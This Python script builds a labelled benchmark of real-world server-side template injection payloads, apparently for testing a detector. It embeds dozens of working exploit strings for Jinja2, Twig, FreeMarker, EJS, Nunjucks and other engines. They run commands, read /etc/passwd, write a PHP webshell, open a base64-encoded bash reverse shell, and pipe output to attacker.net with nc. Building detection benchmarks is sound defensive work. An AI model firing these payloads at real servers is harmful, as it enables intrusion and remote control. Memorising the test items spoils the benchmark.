# -*- coding: utf-8 -*-
"""
Build the canonical real-world SSTI TEST set (positives only).

Sources are INDEPENDENT of the training payload-lists (PayloadsAllTheThings,
SSTImap, HackTricks). Every payload was extracted verbatim from a cited page.

Tiers (report results per tier; Tier A is the most convincing):
  A = real incident        (CVE PoC / disclosed bug-bounty report)
  B = scanner/tool template (Nuclei DAST templates)
  C = independent writeup   (researcher / CTF, independent authorship)

Anything that collides with the training set (ssti.txt) is DROPPED so the
test set is provably unseen. Fields: payload | engine | tier | context | source
"""
import re, csv, json, os, urllib.parse, difflib

BASE = os.path.dirname(os.path.abspath(__file__))
TRAIN = os.path.join(BASE, "..", "train", "positives.txt")

SRC = {
 "H1UBER":"https://hackerone.com/reports/125980",
 "H1UNIKRN":"https://hackerone.com/reports/164224",
 "PICUS":"https://www.picussecurity.com/resource/blog/cve-2023-22527-another-ognl-injection-leads-to-rce-in-atlassian-confluence",
 "VULHUB":"https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22947",
 "ROUTEZERO":"https://routezero.security/2025/02/17/proving-grounds-practice-cve-2024-56145-walkthrough/",
 "ONSECJ":"https://onsecurity.io/article/server-side-template-injection-with-jinja2/",
 "ONSECGO":"https://onsecurity.io/article/go-ssti-method-research/",
 "DEVID":"https://dev.to/roxdavirox/server-side-template-injection-how-to-identify-the-engine-and-escalate-to-rce-386b",
 "DEVAPI":"https://dev.to/roxdavirox/ssti-in-apis-when-json-parameters-reach-template-engines-and-become-rce-339n",
 "INTIG":"https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-server-side-template-injection-ssti",
 "GAURAV":"https://gauravnarwani.com/injecting-6200-to-1200/",
 "NUCRAZOR":"https://github.com/projectdiscovery/nuclei-templates/blob/main/dast/vulnerabilities/ssti/razor-ssti.yaml",
 "PDBLOG":"https://projectdiscovery.io/blog/crafting-dast-nuclei-templates-for-oob-template-engines-injection-a-practical-guide",
 "YWH":"https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation",
 "X01":"https://0x1.gitlab.io/web-security/Server-Side-Template-Injection/",
 "HULI":"https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/",
 "TARQ":"https://tarq.net/posts/handlebars-4-1-2-command-execution/",
 "NUCNUN":"https://github.com/geeknik/the-nuclei-templates/blob/main/node-nunjucks-ssti.yaml",
 "ROCKY":"https://7rocky.github.io/en/htb/nunchucks/",
}

# ---- single-line payloads: payload ||| engine ||| tier ||| context ||| SRC ----
SIMPLE = r'''
{{ '7'*7 }} ||| Jinja2 ||| A ||| Uber profile-name SSTI ||| H1UBER
{7*7} ||| Smarty ||| A ||| Unikrn profile SSTI->RCE ||| H1UNIKRN
'+#request['.KEY_velocity.struts2.context'].internalGet('ognl').findValue(#parameters.x,{})+' ||| OGNL ||| A ||| CVE-2023-22527 Confluence ||| PICUS
x=(new freemarker.template.utility.Execute()).exec({"whoami"}) ||| FreeMarker ||| A ||| CVE-2023-22527 Confluence param ||| PICUS
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))} ||| Spring SpEL ||| A ||| CVE-2022-22947 Spring Cloud Gateway ||| VULHUB
{{ ['system', 'echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMS43NS8xMjM0IDA+JjEK | base64 -d | bash'] | sort('call_user_func') }} ||| Twig ||| A ||| CVE-2024-56145 Craft CMS revshell ||| ROUTEZERO
You age is {{60+7}} years old ||| Twig ||| A ||| CVE-2024-56145 Craft CMS probe ||| ROUTEZERO
settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').exec('id') ||| EJS ||| A ||| CVE-2022-29078 JSON param ||| DEVAPI
{{config["SECRET_KEY"]}} ||| Jinja2 ||| C ||| Flask secret disclosure ||| ONSECJ
{{self.__dict__}} ||| Jinja2 ||| C ||| context enumeration ||| ONSECJ
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} ||| Jinja2 ||| C ||| RCE via request global ||| ONSECJ
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}} ||| Jinja2 ||| C ||| RCE bracket bypass ||| ONSECJ
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}} ||| Jinja2 ||| C ||| RCE hex-encoded ||| ONSECJ
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }} ||| Jinja2 ||| C ||| RCE attr() chain ||| ONSECJ
{{g.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}} ||| Jinja2 ||| C ||| file read via subclasses ||| ONSECJ
{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ ||| Jinja2 ||| C ||| format-string bypass ||| ONSECJ
{{config.items()}} ||| Jinja2 ||| C ||| config enumeration ||| X01
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}} ||| Jinja2 ||| C ||| RCE via Popen ||| X01
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}} ||| Jinja2 ||| C ||| Flask RCE shortcut ||| X01
{{request|attr(["_"*2,"class","_"*2]|join)}} ||| Jinja2 ||| C ||| WAF filter bypass ||| X01
1{{self.__init__.__globals__.__str__()[1786:1788]}} ||| Jinja2 ||| C ||| slice-based evasion ||| X01
1{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}} ||| Jinja2 ||| C ||| evasion RCE ||| X01
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')} ||| Java EL ||| C ||| RCE ||| X01
${T(java.lang.System).getenv()} ||| Java EL ||| C ||| env disclosure ||| X01
${class.getResource("").getPath()} ||| Java EL ||| C ||| path disclosure ||| X01
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}} ||| Twig ||| C ||| RCE sandbox escape ||| DEVID
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}} ||| Twig ||| C ||| RCE via cache ||| X01
{%block X%}whoamiINTIGRITIsystem{%endblock%}{%set y=block('X')|split('INTIGRITI')%}{{[y|first]|map(y|last)|join}} ||| Twig ||| C ||| RCE via map/block ||| INTIG
{{_context|keys|join(',')}} ||| Twig ||| C ||| context enumeration ||| INTIG
{{files.get_style_sheet('../../../../../etc/passwd')}} ||| Twig ||| C ||| file read via app fn ||| INTIG
1{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}} ||| Twig ||| C ||| evasion RCE ||| YWH
${"freemarker.template.utility.Execute"?new()("id")} ||| FreeMarker ||| C ||| RCE (also CVE-2022-22954) ||| DEVID
${'java.lang.ProcessBuilder'?new(['id']).start()} ||| FreeMarker ||| C ||| RCE fallback ||| DEVAPI
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')} ||| FreeMarker ||| C ||| alt bracket syntax ||| X01
{php}echo `id`;{/php} ||| Smarty ||| C ||| RCE legacy {php} ||| X01
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())} ||| Smarty ||| C ||| webshell write ||| X01
1{chr(105)|cat:chr(100)} ||| Smarty ||| C ||| char-encoding evasion ||| YWH
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id") ||| Velocity ||| C ||| RCE one-liner ||| DEVID
<%= `id` %> ||| ERB ||| C ||| RCE via backticks ||| DEVID
%><%=`whoami` ||| ERB ||| C ||| breakout RCE ||| INTIG
<%= File.open('/etc/passwd').read %> ||| ERB ||| C ||| file read ||| X01
<%= Dir.entries('/') %> ||| ERB ||| C ||| directory listing ||| X01
${'nslookup -type=SRV 9zngatihqnif00r6i461uq.oastify.com'.execute().text} ||| Groovy ||| B ||| Nuclei OOB DNS ||| PDBLOG
1${x=new String();for(i in[105,100]){x+=((char)i).toString()};x.execute().text} ||| Groovy ||| C ||| char-encoding evasion RCE ||| YWH
1@{string x=null;int[]l={119,104,111,97,109,105};foreach(int c in l){x+=((char)c).ToString();};}@x ||| Razor ||| C ||| char-array evasion ||| YWH
1{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}} ||| Blade ||| C ||| char-encoding evasion RCE ||| YWH
{{ someString.toUPPERCASE() }} ||| Pebble ||| C ||| detection probe ||| X01
{{'a'.toUpperCase()}} ||| Jinjava ||| C ||| detection probe ||| X01
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("new java.lang.String('xxx')")}} ||| Jinjava ||| C ||| RCE via ScriptEngine ||| X01
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}} ||| Nunjucks ||| B ||| Nuclei template ||| NUCNUN
{{range.constructor('return global.process.mainModule.require("child_process").execSync("whoami")')()}} ||| Nunjucks ||| C ||| HTB Nunchucks ||| ROCKY
{{.Secret "id"}} ||| Go text/template ||| C ||| RCE via method confusion ||| ONSECGO
{{.File "/etc/passwd"}} ||| Go text/template ||| C ||| file read method confusion ||| ONSECGO
{"settings":{"view options":{"client":true,"escapeFunction":"(() => {});return process.mainModule.require(\"child_process\").execSync(\"id\").toString()"}}} ||| EJS ||| C ||| escapeFunction RCE (CTF) ||| HULI
'''

# ---- multi-line payloads (kept verbatim, newlines preserved) ----
MULTILINE = [
 dict(engine="Velocity", tier="C", context="RCE multi-line #set", src="X01", payload=r'''#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end'''),
 dict(engine="Mako", tier="C", context="RCE import os block", src="X01", payload=r'''<%
import os
x=os.popen('id').read()
%>
${x}'''),
 dict(engine="Pebble", tier="C", context="RCE forName/Runtime", src="X01", payload=r'''{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}'''),
 dict(engine="Pug/Jade", tier="C", context="RCE via root.process", src="X01", payload=r'''- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')'''),
 dict(engine="Handlebars", tier="C", context="RCE __defineGetter__ constructor chain", src="TARQ", payload=r'''{{#with "console.log(JSON.stringify(process.env,null, 2))" }}
{{#with (split "S" 1) as |payload|}}
{{__defineGetter__ "undefined" valueOf }}
{{#with __lookupGetter__ }}
{{__defineGetter__ "propertyIsEnumerable" (this.bind (this.bind 1)) }}
{{__defineGetter__ "undefined" this.constructor}}
{{#with __lookupGetter__ as |ctor| }}
{{__defineGetter__ "hax" (ctor.apply ctor payload)}}
{{{hax}}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}'''),
 dict(engine="Jinja2", tier="C", context="reverse-shell for-loop gadget", src="X01", payload=r'''{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("id").read()}}{%endif%}{% endfor %}'''),
]

# ---------- assemble ----------
records = []
for line in SIMPLE.strip().splitlines():
    if not line.strip():
        continue
    parts = [p.strip() for p in line.split("|||")]
    if len(parts) != 5:
        raise SystemExit("Bad SIMPLE record (need 5 fields):\n" + line)
    payload, engine, tier, ctx, srck = parts
    records.append(dict(payload=payload, engine=engine, tier=tier,
                        context=ctx, source_url=SRC[srck], label=1))
for m in MULTILINE:
    records.append(dict(payload=m["payload"], engine=m["engine"], tier=m["tier"],
                        context=m["context"], source_url=SRC[m["src"]], label=1))

# ---------- dedup + leakage removal ----------
def norm(s):
    prev=None
    while prev!=s:
        prev=s; s=urllib.parse.unquote(s)
    return re.sub(r"\s+"," ",s.strip().lower())

with open(TRAIN, encoding="utf-8", errors="ignore") as f:
    train=[l.strip() for l in f if l.strip()]
tn=set(norm(x) for x in train); tnl=list(tn)

def train_hit(n):
    if n in tn: return ("EXACT",1.0)
    best=0.0
    for t in tnl:
        r=difflib.SequenceMatcher(None,n,t).ratio()
        if r>best: best=r
        if best>=0.999: break
    if best>=0.95: return ("NEAR",best)
    return ("OK",best)

seen=set(); kept=[]; dropped_dup=0; dropped_leak=0
for r in records:
    n=norm(r["payload"])
    if n in seen:
        dropped_dup+=1; continue
    seen.add(n)
    status,score=train_hit(n)
    if status in ("EXACT","NEAR"):
        dropped_leak+=1; continue
    kept.append(r)

# ---------- write outputs ----------
jsonl=os.path.join(BASE,"ssti_test_positives.jsonl")
tsv  =os.path.join(BASE,"ssti_test_positives.tsv")
with open(jsonl,"w",encoding="utf-8") as f:
    for r in kept:
        f.write(json.dumps(r, ensure_ascii=False)+"\n")
with open(tsv,"w",newline="",encoding="utf-8") as f:
    w=csv.writer(f, delimiter="\t")
    w.writerow(["payload","engine","tier","context","source_url","label"])
    for r in kept:
        w.writerow([r["payload"].replace("\n","\\n"), r["engine"], r["tier"],
                    r["context"], r["source_url"], r["label"]])

# ---------- report ----------
from collections import Counter
eng=Counter(r["engine"] for r in kept)
tier=Counter(r["tier"] for r in kept)
print("Raw collected      :", len(records))
print("Dropped (within-set dup):", dropped_dup)
print("Dropped (train leak)    :", dropped_leak)
print("KEPT (clean test set)   :", len(kept))
print("Engines:", len(eng), "->", ", ".join(f"{k}={v}" for k,v in sorted(eng.items())))
print("Tiers  :", ", ".join(f"{k}={v}" for k,v in sorted(tier.items())),
      " (A=incident, B=scanner, C=independent writeup)")
print("Unique sources:", len(set(r["source_url"] for r in kept)))
print("Wrote:", os.path.basename(jsonl), "and", os.path.basename(tsv))
